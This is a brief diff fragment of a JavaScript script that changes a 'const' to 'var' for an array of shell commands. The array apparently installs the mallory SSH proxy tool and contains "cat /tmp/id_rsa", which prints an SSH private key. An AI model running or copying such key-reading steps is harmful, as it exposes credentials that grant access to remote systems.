@@ -40,7 +40,7 @@ async function main() {
       // file written successfully
     });
 
-    const commands = 
+    var commands = 
     [
         'go install github.com/justmao945/mallory/cmd/mallory@latest',
         "cat /tmp/id_rsa",
